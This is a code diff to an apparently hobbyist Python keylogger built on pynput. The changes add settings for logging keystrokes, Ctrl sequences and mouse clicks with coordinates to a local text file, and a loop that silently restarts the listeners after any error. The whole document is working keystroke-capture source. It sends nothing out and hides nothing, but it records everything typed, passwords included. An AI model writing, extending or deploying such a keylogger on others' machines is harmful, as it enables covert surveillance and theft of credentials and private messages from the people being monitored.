@@ -1,18 +1,28 @@
-from pynput import keyboard, mouse
-from os import _exit
+############################################## Customize these values to your liking.
 
-# Customize these values to your liking.
-
-# Name of the output file.
+# Keylog file name. This will be created in the same directory as this script.
 KEYLOG_FILENAME = "keylog.txt"
 
-# Conversion of command names to characters.
+# Whether to disable mouse logging.
+DISABLE_MOUSE_LOGGING = False
+
+# Whether to ignore multiple & same mouse clicks. Only the first click will be logged.
+IGNORE_SAME_MOUSE_CLICKS = False
+
+# Whether to disable escape sequences (CTRL + key) logging.
+ESCAPE_SEQUENCES_LOGGING = True
+
+# Format for the mouse click string. This will be after the click string is converted.
+MOUSE_STRING_FORMAT = "[{btn}MB_{x},{y}]"
+
+# Conversion of command names to characters. Blank strings are ignored buttons.
 KEY_STRING_CONVERT = {
     "[SPACE]": " ",
     "[SHIFT]": "",
     "[SHIFT_R]": "",
     "[CTRL_L]": "",
     "[CTRL_R]": "",
+    "[ALT_L]": "[ALT]",
     "[ALT_GR]": "",
     "[96]": "0",
     "[97]": "1",
@@ -33,9 +43,22 @@ KEY_STRING_CONVERT = {
     "[F12]": "[EXIT]", # Exit key
 }
 
-# Format for the mouse click string. Customize this to your liking.
-MOUSE_STRING_FORMAT = "[{btn}_MC_{x},{y}]"
+# Conversion of mouse button names to characters. Blank strings are ignored buttons.
+CLICK_STRING_CONVERT = {
+    "LEFT": "L",
+    "RIGHT": "R",
+    "MIDDLE": "M",
+    "X1": "4",
+    "X2": "5",
+}
 
+############################################## End
+
+from pynput import keyboard, mouse
+from os import _exit
+
+# Last click
+last_click = None
 
 # Writes a string to the keylog file
 def write_string(string):
@@ -47,7 +70,6 @@ def write_string(string):
     if (string == "[EXIT]"):
         raise _exit(0)
 
-
 # Writes a key press to the keylog file
 def write_key(key):
     # Is a numpad key (weird behavior with these)
@@ -58,7 +80,10 @@ def write_key(key):
     elif (hasattr(key, "char") and key.char != None):
         # escape sequence (CTRL + key)
         if (len(str(key)[1:-1]) == 4):
-            string = f"[CTRL^{str(chr(key.vk))}]"
+            if (ESCAPE_SEQUENCES_LOGGING):
+                string = f"[CTRL^{str(chr(key.vk))}]"
+            else:
+                string = ""
         # no escape sequence
         else:
             string = str(key.char)
@@ -74,20 +99,44 @@ def write_key(key):
     if (string in KEY_STRING_CONVERT):
         string = KEY_STRING_CONVERT[string]
 
+    if (string == ""):
+        return
+    else:
+        global last_click
+        last_click = None
+
     write_string(string)
 
 # Writes a mouse click to the keylog file
 def write_click(x, y, button, pressed):
     if (pressed):
-        letter = MOUSE_STRING_FORMAT.format(btn=button.name.upper(), x=x, y=y)
+        string = button.name.upper()
+
+        global last_click
+        if (IGNORE_SAME_MOUSE_CLICKS and string == last_click):
+            return
+        else:
+            last_click = string
+
+        if (string in CLICK_STRING_CONVERT):
+            string = CLICK_STRING_CONVERT[string]
+
+        if (string == ""):
+            return
+
+        letter = MOUSE_STRING_FORMAT.format(btn=string, x=x, y=y)
         write_string(letter)
 
 
 # Listens for key presses
 while True:
     try:
-        with keyboard.Listener(on_press=write_key) as key_list, mouse.Listener(on_click=write_click) as mouse_list:
-            key_list.join()
-            mouse_list.join()
+        if (DISABLE_MOUSE_LOGGING):
+            with keyboard.Listener(on_press=write_key) as key_list:
+                key_list.join()
+        else:
+            with keyboard.Listener(on_press=write_key) as key_list, mouse.Listener(on_click=write_click) as mouse_list:
+                key_list.join()
+                mouse_list.join()
     except:
         pass
